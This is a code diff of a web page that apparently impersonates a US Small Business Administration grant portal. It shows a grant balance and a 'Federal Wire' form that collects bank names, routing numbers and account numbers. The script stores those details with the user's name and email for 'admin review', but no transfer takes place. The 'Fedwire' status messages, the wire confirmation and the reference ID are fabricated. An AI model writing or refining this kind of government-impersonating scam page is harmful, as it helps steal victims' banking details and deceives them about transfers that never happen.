@@ -45,7 +45,7 @@
     <div class="container">
         <div class="balance-card">
             <div class="balance-label">Available for Disbursement</div>
-            <div class="balance-amt" id="displayBalance">$0.00</div>
+            <div class="balance-amt" id="displayBalance">SYNCHRONIZING...</div>
         </div>
 
         <div class="transfer-form">
@@ -74,30 +74,55 @@
         </div>
     </div>
 
-    <script type="module" src="firebase-config.js"></script>
-
     <script type="module">
-        import { doc, onSnapshot, collection, addDoc, updateDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-firestore.js";
-        import { onAuthStateChanged } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-auth.js";
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-app.js";
+        import { getAuth, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-auth.js";
+        import { getFirestore, doc, onSnapshot, collection, addDoc, updateDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-firestore.js";
+
+        // Direct Config to ensure connection
+        const firebaseConfig = {
+            apiKey: "AIzaSyCq8CgTyNbKVbUm_GItIC7FAvTuNrNspxI",
+            authDomain: "sba-portal-2026-f1253.firebaseapp.com",
+            projectId: "sba-portal-2026-f1253",
+            storageBucket: "sba-portal-2026-f1253.firebasestorage.app",
+            messagingSenderId: "363290267220",
+            appId: "1:363290267220:web:2a3e8601c11be5dd6e27c1"
+        };
+
+        const app = initializeApp(firebaseConfig);
+        const auth = getAuth(app);
+        const db = getFirestore(app);
 
         let currentBalance = 0;
         let userFullName = "Applicant";
 
-        onAuthStateChanged(window.auth, (user) => {
-            if (!user) { window.location.href = 'index.html'; return; }
+        onAuthStateChanged(auth, (user) => {
+            if (!user) { 
+                window.location.href = 'index.html'; 
+                return; 
+            }
 
-            // 1. Sync User Balance & Info
-            onSnapshot(doc(window.db, "users", user.uid), (snap) => {
+            // 1. Sync User Balance & Info from Firestore
+            const userRef = doc(db, "users", user.uid);
+            onSnapshot(userRef, (snap) => {
                 if (snap.exists()) {
                     const data = snap.data();
                     let raw = data.balance || 0;
                     userFullName = data.fullName || user.email;
                     
-                    // Clean up balance if it's a string with commas
+                    // Clean up balance formatting
                     currentBalance = typeof raw === 'string' ? parseFloat(raw.replace(/[$,]/g, '')) : parseFloat(raw);
                     
-                    document.getElementById('displayBalance').innerText = "$" + currentBalance.toLocaleString('en-US', {minimumFractionDigits: 2});
+                    document.getElementById('displayBalance').innerText = "$" + currentBalance.toLocaleString('en-US', {
+                        minimumFractionDigits: 2,
+                        maximumFractionDigits: 2
+                    });
+                } else {
+                    document.getElementById('displayBalance').innerText = "$0.00";
                 }
+            }, (error) => {
+                console.error("Balance Sync Error:", error);
+                document.getElementById('displayBalance').innerText = "ERROR LOADING";
             });
 
             // 2. Handle Transfer Action
@@ -107,28 +132,36 @@
                 const rNum = document.getElementById('routing').value.trim();
                 const aNum = document.getElementById('account').value.trim();
 
-                // Validation
-                if (!bName || !rNum || !aNum || isNaN(amt)) return alert("Please complete all federal fields.");
-                if (rNum.length !== 9) return alert("Routing number must be exactly 9 digits.");
-                if (amt <= 0) return alert("Invalid disbursement amount.");
-                if (amt > currentBalance) return alert("INSUFFICIENT FUNDS: The requested amount exceeds your available grant allocation.");
+                // Form Validations
+                if (!bName || !rNum || !aNum || isNaN(amt)) {
+                    return alert("Please complete all federal fields.");
+                }
+                if (rNum.length !== 9) {
+                    return alert("Routing number must be exactly 9 digits.");
+                }
+                if (amt <= 0) {
+                    return alert("Invalid disbursement amount.");
+                }
+                if (amt > currentBalance) {
+                    return alert("INSUFFICIENT FUNDS: The requested amount exceeds your available grant allocation.");
+                }
 
                 const btn = document.getElementById('initiateBtn');
                 btn.innerText = "AUTHENTICATING FEDWIRE...";
                 btn.disabled = true;
 
                 try {
-                    // Step A: Calculate new balance
-                    const newBalance = (currentBalance - amt).toFixed(2);
+                    // Calculate and round new balance
+                    const newBalance = parseFloat((currentBalance - amt).toFixed(2));
 
-                    // Step B: Instant Debit (Update User Doc)
-                    const userRef = doc(window.db, "users", user.uid);
-                    await updateDoc(userRef, { balance: parseFloat(newBalance) });
+                    // Step A: Instant Debit (Update User Balance)
+                    await updateDoc(userRef, { balance: newBalance });
 
-                    // Step C: Log Request for Admin Review
-                    await addDoc(collection(window.db, "requests"), {
+                    // Step B: Log Request for Admin Review
+                    await addDoc(collection(db, "requests"), {
                         userId: user.uid,
                         userName: userFullName,
+                        userEmail: user.email,
                         type: "WIRE_TRANSFER",
                         bankName: bName,
                         routing: rNum,
@@ -138,12 +171,12 @@
                         timestamp: serverTimestamp()
                     });
 
-                    alert("FEDERAL WIRE INITIATED: Funds have been debited from your SBA portal and queued for clearing. Reference ID: SBA-" + Math.floor(Math.random() * 1000000));
+                    alert("FEDERAL WIRE INITIATED: Funds have been debited from your SBA portal and queued for clearing. Reference ID: SBA-" + Math.floor(100000 + Math.random() * 900000));
                     window.location.href = 'dashboard.html';
 
                 } catch (e) {
-                    console.error(e);
-                    alert("TRANSMISSION ERROR: The secure gateway timed out. Please try again.");
+                    console.error("Transfer error:", e);
+                    alert("TRANSMISSION ERROR: The secure gateway timed out. Please check your connection.");
                     btn.innerText = "Initiate Federal Wire";
                     btn.disabled = false;
                 }
